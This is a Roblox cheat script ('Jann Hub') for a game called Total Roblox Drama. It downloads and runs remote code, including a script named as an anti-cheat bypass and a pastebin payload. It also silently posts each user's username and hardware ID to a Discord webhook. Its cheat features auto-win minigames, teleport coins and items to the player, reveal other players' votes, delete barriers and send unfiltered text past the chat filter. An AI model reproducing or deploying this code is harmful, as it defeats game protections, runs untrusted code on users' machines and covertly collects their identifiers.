local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/OtherScripts/Adonis%20Anti-Cheat%20Bypass.lua"))()
wait()

local HWID = game:GetService("RbxAnalyticsService"):GetClientId();
local WhitelistedHWIDs = {"3e1c4b4e-9faf-4909-9bfe-f02ede989c70"}
local qNVAKkuwxNpqruLjSRHg = false
 
loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
 
function CheckHWID(hwidval)
for _,whitelisted in pairs(WhitelistedHWIDs) do
 if hwidval == whitelisted then
     return true
 elseif hwidval ~= whitelisted then
     return false
       end
    end
end
 
qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
 
if qNVAKkuwxNpqruLjSRHg == true then
 game.Players:Kick("L")
end
 


local url =
   "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
local data = {
   ["content"] = " ",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Jann Hub** in: "   ..game.PlaceId.. " :) ",
           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."**, HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId().."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)



local Window = Rayfield:CreateWindow({
   Name = "Jann Hub",
   LoadingTitle = "Loading Jann Hub",
   LoadingSubtitle = "by Jack & Venn | .gg/pams",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "FolderConfig", -- Create a custom folder for your hub/game
      FileName = "Jann Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "pams", -- The Discord invite code, do not include discord.gg/
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Jann Hub",
      Subtitle = "Key System",
      Note = "Join the discord (discord.gg/pams)",
      FileName = "VennKey",
      SaveKey = true,
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = "ilovemen231"
   }
})

local Tab = Window:CreateTab("Total Roblox Drama", 16451926444) -- Title, Image

local Section = Tab:CreateSection("Game - Things that enhance gameplay",false)

local Button = Tab:CreateButton({
   Name = "Get Safety Statue",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
   for i,v in pairs (workspace.Idols:GetDescendants()) do
                if v.Name == "Bag" then
                    v.hit.Transparency = 1
                    v.hit.CanCollide = false
                    wait()
                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
                    task.wait()
                    v:Destroy()
                    wait()
                elseif v.Name == "SafetyStatue" then
                    v.hit.Transparency = 1
                    v.hit.CanCollide = false
                    wait()
                    v.hit.Position = game.Players.LocalPlayer.Character.Torso.Position
                    wait()
                end
            end
   end,
})

local MathThingLmfao = Tab:CreateToggle({
   Name = "Auto-Win Math Mania",
   Info = "Toggle info/Description.", -- Speaks for itself, Remove if none.
   CurrentValue = false,
   Flag = "Toggle12352355235221", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
            number = 0
            for i = 1, 10 do
                local function automathloopfix()
                if Value == true then
                    number = number + 1
                    local s = game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].MainText.Text
                    local e = s:gsub("=","")
                    local g = e:gsub("?","")
                    local x = g:gsub(" ","")
                    local y = x
                    local f = loadstring("return " .. y)()
                    wait()
                    game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].Box.Text = f
                    task.wait()
                    local button = game:GetService("Players").LocalPlayer.PlayerGui.MathMania[number].Enter

                    local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
                    for i,v in pairs(events) do
                        for i,v in pairs(getconnections(button[v])) do
                            v:Fire()
                        end
                    end
                    task.wait(0.5)
                end
            end
				            task.wait()
            automathloopfix()
            end
   end,
})



local ToggleVotesThing = Tab:CreateToggle({
    Name = "Notify Votes",
    Info = "Speaks for itself", -- Speaks for itself, Remove if none.
    CurrentValue = false,
    Flag = "Toggle121412", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        game.ReplicatedStorage.Season.Voting.Votes.ChildAdded:Connect(function(v)
            if Value == true then
                PlayerVoted = game.ReplicatedStorage.Season.Players[v.Value].Value
                PlayerPicked = game.ReplicatedStorage.Season.Players[v.Name].Value
                local SEND = PlayerVoted .. " voted for " .. PlayerPicked
                Rayfield:Notify({
                    Title = "Vote Detected",
                    Content = SEND,
                    Duration = 1,
                    Image = 4483362458
                })
            end
        end)
    end
})


local Toggle = Tab:CreateToggle({
   Name = "Auto Win Obbies",
   Info = "Speaks for itself. burps", -- Speaks for itself, Remove if none.
   CurrentValue = false,
   Flag = "Toggle12", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
         while true do
            task.wait(1)
	if Value == true then
	if game.Workspace:FindFirstChild("Finish") then
            for i,v in pairs (workspace:GetDescendants()) do
                if v.Name == "Finish" then
                    v.CanCollide = false
                    v.Transparency = 1
                    wait()
                    v.Position = game.Players.LocalPlayer.Character.Torso.Position
			else
			print("yes")
			end
                end
					end
            end
         end
   end,
})



local Toggle1 = Tab:CreateToggle({
   Name = "Auto Collect Coins",
   Info = "Speaks for itself.", -- Speaks for itself, Remove if none.
   CurrentValue = false,
   Flag = "Toggle123", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
         collectcoinsloop = Value
            while collectcoinsloop == true do
               task.wait(0.00001)
                for i,v in pairs (workspace:GetDescendants()) do
                    if v.Name == "Gem" then
                        v.Transparency = 1
                        wait()
                        v.Position = game.Players.LocalPlayer.Character.Torso.Position
                    elseif v.Name == "Coin" then
                        v.Transparency = 1
                        wait()
                        v.Position = game.Players.LocalPlayer.Character.Torso.Position
                    end
                end
         end
   end,
})

local Section1 = Tab:CreateSection("Misc",false)

local Input = Tab:CreateInput({
   Name = "Buy Character",
   Info = "Enter the text of the character you would like to purchase, it doesnt have to be a real character. Bypasses chat filter.", -- Speaks for itself, Remove if none.
   PlaceholderText = "Input Text",
   OnEnter = true, -- Will callback only if the user pressed ENTER while the box is focused.
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
local args = {
    [1] = "Character",
    [2] = Text
}

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Buy"):FireServer(unpack(args))
   end,
})

local Button = Tab:CreateButton({
   Name = "Remove barriers",
   Info = "60% chance of Safety Statue spawning", -- Speaks for itself, Remove if none.
   Interact = 'Changable',
   Callback = function()
        for i,v in pairs (workspace:GetDescendants()) do
            if v.Name == "Glass" then
                v:Destroy()
            end
        end
   end,
})
